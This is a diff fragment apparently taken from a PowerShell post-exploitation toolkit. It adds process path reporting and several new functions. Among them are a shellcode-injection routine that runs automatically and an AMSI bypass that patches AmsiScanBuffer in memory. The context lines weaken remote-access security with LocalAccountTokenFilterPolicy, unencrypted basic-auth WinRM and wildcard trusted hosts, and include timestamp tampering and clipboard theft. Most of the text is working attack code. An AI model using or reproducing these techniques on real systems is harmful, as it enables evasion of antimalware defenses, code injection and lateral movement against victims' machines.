-Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-ItemProperty –Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System –Name  LocalAccountTokenFilterPolicy –Value 1 –Type DWord}
+Invoke-command -computer localhost -credential $getcreds -scriptblock { set-itemproperty -path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 -Type Dword}
 Invoke-Command -Computer localhost -Credential $getcreds -Scriptblock {Set-Item WSMan:localhost\client\trustedhosts -value * -force}
 $command = "cmd /c powershell.exe -c Set-WSManQuickConfig -Force;Set-Item WSMan:\localhost\Service\Auth\Basic -Value $True;Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $True; Register-PSSessionConfiguration -Name Microsoft.PowerShell -Force"
 $PSS = ConvertTo-SecureString $password -AsPlainText -Force
@@ -472,10 +601,11 @@ if (Test-Win64) {
         $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
         if($file -eq "wow64.dll") {
             $processes32bit += $process
-            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, Username
+            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
             $pobject.Id = $process.Id
-            $pobject.StartTime = $process.starttime
+            $pobject.StartTime = $process.StartTime
             $pobject.Name = $process.Name
+			$pobject.Path = $process.Path
             $pobject.Arch = "x86"
             $pobject.UserName = $owners[$process.Id.tostring()]
             $AllProcesses += $pobject
@@ -485,10 +615,11 @@ if (Test-Win64) {
 
     if(!($processes32bit -contains $process)) {
         $processes64bit += $process
-        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, UserName
+        $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
         $pobject.Id = $process.Id
-        $pobject.StartTime = $process.starttime
+        $pobject.StartTime = $process.StartTime
         $pobject.Name = $process.Name
+		$pobject.Path = $process.Path
         $pobject.Arch = "x64"
         $pobject.UserName = $owners[$process.Id.tostring()]
         $AllProcesses += $pobject
@@ -498,10 +629,11 @@ if (Test-Win64) {
 elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
 foreach($process in get-process) {
     $processes32bit += $process
-    $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, Username
+    $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
     $pobject.Id = $process.Id
-    $pobject.StartTime = $process.starttime
+    $pobject.StartTime = $process.StartTime
     $pobject.Name = $process.Name
+	$pobject.Path = $process.Path
     $pobject.Arch = "x86"
     $pobject.UserName = $owners[$process.Id.tostring()]
     $AllProcesses += $pobject
@@ -514,10 +646,11 @@ elseif ((Test-Win32) -and (Test-Wow64)) {
         $file = [System.IO.Path]::GetFileName($module.FileName).ToLower()
         if($file -eq "wow64.dll") {
             $processes32bit += $process
-            $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, Username
+            $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, Username
             $pobject.Id = $process.Id
-            $pobject.StartTime = $process.starttime
+            $pobject.StartTime = $process.StartTime
             $pobject.Name = $process.Name
+			$pobject.Path = $process.Path
             $pobject.Arch = "x86"
             $pobject.UserName = $owners[$process.Id.tostring()]
             $AllProcesses += $pobject
@@ -527,10 +660,11 @@ elseif ((Test-Win32) -and (Test-Wow64)) {
 
     if(!($processes32bit -contains $process)) {
         $processes64bit += $process
-        $pobject = New-Object PSObject | Select ID, StartTime, Name, Arch, UserName
+        $pobject = New-Object PSObject | Select ID, StartTime, Name, Path, Arch, UserName
         $pobject.Id = $process.Id
         $pobject.StartTime = $process.starttime
         $pobject.Name = $process.Name
+		$pobject.Path = $process.Path
         $pobject.Arch = "x64"
         $pobject.UserName = $owners[$process.Id.tostring()]
         $AllProcesses += $pobject
@@ -540,7 +674,7 @@ elseif ((Test-Win32) -and (Test-Wow64)) {
     Write-Output "Unknown Architecture"
 }
 
-$AllProcesses|Select ID, Arch, Name, UserName, StartTime | format-table -auto
+$AllProcesses|Select ID, UserName, Arch, Name, Path, StartTime | format-table -auto
 
 }
 Function Invoke-Netstat {                       
@@ -582,6 +716,14 @@ elseif (($t -and [IntPtr]::size -eq 4)) {
     Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
 }
+Function AutoMigrate-Always {
+if ([IntPtr]::size -eq 8){
+   Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
+} 
+elseif ([IntPtr]::size -eq 4) {
+    Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
+}
+}
 Function TimeStomp($File, $Date) {
     $file=(gi $file) 
     $file.LastWriteTime=$date;
@@ -591,4 +733,39 @@ Function TimeStomp($File, $Date) {
 Function Get-Clipboard {
     add-type -a system.windows.forms
     [windows.forms.clipboard]::GetText()
+}
+Function Get-AllServices {
+    $Keys = Get-ChildItem HKLM:\System\CurrentControlSet\services; $Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath }
+    ForEach ($Item in $Items) {$n=$Item.PSChildName;$i=$Item.ImagePath;$d=$Item.Description; echo "Name: $n `nImagePath: $i `nDescription: $d`n"}
+}
+Function Get-AllFirewallRules($path) {
+    $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
+    if ($path) {
+        $Rules | export-csv $path -NoTypeInformation
+    } else {
+        $Rules
+    }
+}
+Function Unhook-AMSI {
+    
+    $win32 = @"
+using System.Runtime.InteropServices;
+using System;
+public class Win32 {
+[DllImport("kernel32")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+[DllImport("kernel32")]
+public static extern IntPtr LoadLibrary(string name);
+[DllImport("kernel32")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect
+);
+}
+"@
+Add-Type $win32
+$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
+$b = 0
+[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
+$buf = New-Object Byte[] 7
+$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)
 }
